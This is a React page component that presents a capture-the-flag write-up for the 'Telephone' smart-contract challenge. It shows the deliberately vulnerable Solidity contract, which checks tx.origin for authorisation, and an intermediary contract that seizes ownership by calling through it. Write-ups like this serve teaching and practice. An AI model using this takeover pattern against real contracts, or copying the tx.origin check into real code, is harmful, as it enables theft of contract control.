import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Telephone = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  interface ITelephone {
      function changeOwner(address _owner) external;
  }
  
  contract TelephoneCaller {
      address public telephoneAddress;
  
      constructor(address _telephoneAddress) {
          telephoneAddress = _telephoneAddress;
      }
  
      function callTelephoneContract(address _newOwner) external {
          ITelephone(telephoneAddress).changeOwner(_newOwner);
      }
  }  
`;

  return (
    <div>
      <h1 className="headerText">Telephone</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText">Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="Simple one. We'll make an intermediate contract on Remix. 
          When we will call intermediate contract, which is calling telephone contract, msg.sender will equal to intermediate contract address, and 
          tx.origin will equal to msg.sender (player address)."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Telephone;
